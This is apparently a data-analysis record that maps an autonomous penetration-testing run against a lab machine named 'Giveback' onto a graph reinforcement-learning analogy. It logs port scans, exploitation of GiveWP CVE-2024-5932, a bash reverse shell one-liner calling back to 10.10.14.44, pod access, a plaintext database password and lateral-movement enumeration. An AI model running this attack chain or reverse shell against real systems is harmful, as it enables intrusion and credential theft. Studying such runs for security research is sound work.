paper_analogy: Deep Reinforcement Learning on Graphs for Autonomous Search-and-Track
source: training_data.csv, Machine == 'Giveback', 28 row(s), 3 auto-detected run(s)/playthroughs. Graph built directly from the PTT (Penetration Testing Tree) field's growth.

analogy_mapping.Agent Nodes: PTT snapshot reached after each new tree item (state = cumulative tree)
analogy_mapping.Search Nodes: The PTT tree item worked on (number + title) + its MCP_tasks tool calls
analogy_mapping.Track Nodes: That item's findings payload -- what was actually discovered

node_types.Agent (Blue/Pink goal): PTT state after a new item completes
node_types.Search (Orange): PTT item being worked (tool calls in tooltip)

edge_types.StateTransition (Black): Agent -> Agent, label = PTT item number
edge_types.SearchUpdate (Green): Agent -> Search, item being worked from that state
edge_types.TrackUpdate (Blue): Search -> Track, what item's execution found
edge_types.Prediction (Purple): Track -> Agent, leads to next cumulative PTT state

[Run 2/3] 1.1 Perform initial port scan: Three open ports discovered on target 10.129.242.171: Port 22 (SSH) - OpenSSH 8.9p1, Port 80 (HTTP) - nginx 1.28.0, Port 30686 (Unknown service). Extra routing hop to port 80 suggests containerized infrastructure.

1.2 Identify running services: SSH, HTTP with nginx, unknown service on port 30686

2.1 Enumerate HTTP/HTTPS services: WordPress 6.8.1 charity platform identified. WPScan enumeration revealed GiveWP plugin version 3.14.0 with 22 vulnerabilities. Most critical: CVE-2024-5932 (unauthenticated PHP object injection leading to RCE). WordPress version 6.8.1 has two additional flaws.

2.2 Enumerate unknown services: Port 30686 returns Kubernetes-specific metadata about service named wp-nginx-service, including namespace and endpoint information. Confirms containerized Kubernetes environment.

3.1 Research GiveWP CVE-2024-5932: Public proof-of-concept available. Vulnerability exploits PHP object deserialization through donation form parameter. Crafted serialized PHP object containing POP chain enables arbitrary code execution. Exploit targets vulnerable donation endpoint.

4.1 Prepare reverse shell payload: Bash reverse shell payload: bash -c "bash -i >& /dev/tcp/10.10.14.44/443 0>&1"

4.2 Execute CVE-2024-5932 exploit: Shell access achieved inside Kubernetes pod running WordPress. Pod name: beta-vino-wp-wordpress-774fb955fd-8tx5b. Running as UID 1001 with root group membership.

5.1 Enumerate container environment: Bitnami WordPress Helm chart installation. Mounted Kubernetes secrets containing database credentials. Environment variables reveal: MariaDB service at 10.43.147.82:3306, Legacy intranet CMS at 10.43.2.241:5000, Additional WordPress instances, Kubernetes API endpoint.

5.2 Search for credentials and secrets: Database password: sW5sp4spa3u7RLyetrekE4oS

6 Lateral Movement: 6.1. Access MariaDB database [not applicable]

6.2 Enumerate legacy intranet CMS: Custom PHP-CGI application at port 5000. Endpoint /phpinfo.php?debug accessible in debug mode. PHP 8.3.3 running as CGI/FastCGI. Windows-to-Linux migration note indicates legacy CGI handling. Vulnerable configuration detected.
